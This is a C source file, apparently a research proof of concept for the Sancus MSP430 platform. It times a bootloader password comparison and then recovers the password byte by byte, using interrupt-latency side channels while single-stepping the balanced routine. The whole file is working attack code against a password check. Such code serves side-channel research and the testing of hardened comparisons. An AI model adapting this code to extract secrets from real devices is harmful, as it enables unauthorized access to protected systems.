#include <sancus/sm_support.h>
#include <sancus_support/sancus_step.h>
#include <sancus_support/timer.h>
#include <sancus_support/sm_io.h>
#include <msp430.h>
#include "sm-bsl.h"
#include <stdbool.h>

/*
 * Number of cycles up to first conditional jump in balanced BSL password
 * comparison routine. (Experimental value)
 */
#define FIRST_NOP_POINT 42
#define NOP_INTERVAL 11
#define NOP_LATENCY 1

unsigned int step = 1;
unsigned int byte_index = 0;
bool correct = false;

void attacker_isr(void) {
    unsigned int latency = __ss_get_latency();
    if (step == FIRST_NOP_POINT + byte_index * NOP_INTERVAL) {
        if (latency == NOP_LATENCY) {
            correct = true;
        }
    }
    step++;
}

int main(void)
{
    msp430_io_init();
    asm("eint\n\t");
    sancus_enable(&sm_bsl);

    char ivt_wrong1[BSL_PASSWORD_LENGTH], ivt_wrong2[BSL_PASSWORD_LENGTH];
    char *ivt = (char*) INTERRUPT_VECTOR_START;
    for (int i = 0; i < BSL_PASSWORD_LENGTH; i++, ivt++)
    {
        pr_info2("ivt[%d] is 0x%x\n", i, *ivt & 0xff);
        ivt_wrong1[i] = *ivt;
        ivt_wrong2[i] = *ivt;
    }
    ivt_wrong1[0] = 0xaa;
    ivt_wrong2[0] = 0xaa;
    ivt_wrong2[1] = 0xaa;

    /** Reference measurements to ensure balancing masks timing differences **/
    pr_info("Testing balanced BSL for end-to-end execution timing attack...");

    int tsc1, tsc2, tsc3, tsc4;

    timer_tsc_start();
    BSL430_unlock_BSL_unbalanced(ivt_wrong1);
    tsc1 = timer_tsc_end();

    timer_tsc_start();
    BSL430_unlock_BSL_unbalanced(ivt_wrong2);
    tsc2 = timer_tsc_end();

    timer_tsc_start();
    BSL430_unlock_BSL_balanced(ivt_wrong1);
    tsc3 = timer_tsc_end();

    timer_tsc_start();
    BSL430_unlock_BSL_balanced(ivt_wrong2);
    tsc4 = timer_tsc_end();

    pr_info1("Unbalanced: wrong pwd[0] byte with TSC %d\n", tsc1);
    pr_info1("Unbalanced: wrong pwd[0]+[1] bytes with TSC %d\n", tsc2);
    pr_info1("Balanced: wrong pwd[0] byte with TSC %d\n", tsc3);
    pr_info1("Balanced: wrong pwd[0]+[1] bytes with TSC %d\n", tsc4);

    if (tsc1 + 2 != tsc2)
        pr_info("--> WARNING: unbalanced BSL is not retarded by two cycles.\n");
    else if (tsc3 != tsc4)
        pr_info("--> WARNING: hardened BSL pwd comparison is unbalanced..\n");
    else
        pr_info("--> OK");

    /** Attack balanced BSL byte per byte through IRQ latency **/

    char guess[BSL_PASSWORD_LENGTH];
    for (int i = 0; i < BSL_PASSWORD_LENGTH; i++)
        guess[i] = 0xaa;

    for (byte_index = 0; byte_index < BSL_PASSWORD_LENGTH; byte_index++)
    {
        pr_info1("Attacking password byte %02d\n", byte_index);
        correct = false;

        for (int pwd_byte = 0; pwd_byte < 256 && !correct; pwd_byte++)
        {
            guess[byte_index] = (char) pwd_byte;
            step = 1;
            __ss_start();
            BSL430_unlock_BSL_balanced(guess);
        }
    }

    for (int i = 0; i < BSL_PASSWORD_LENGTH; i++)
    {
        pr_info2("guess[%d] is 0x%x\n", i, guess[i] & 0xff);
    }
    EXIT();
}

SANCUS_STEP_ISR_ENTRY2(attacker_isr, __ss_end);
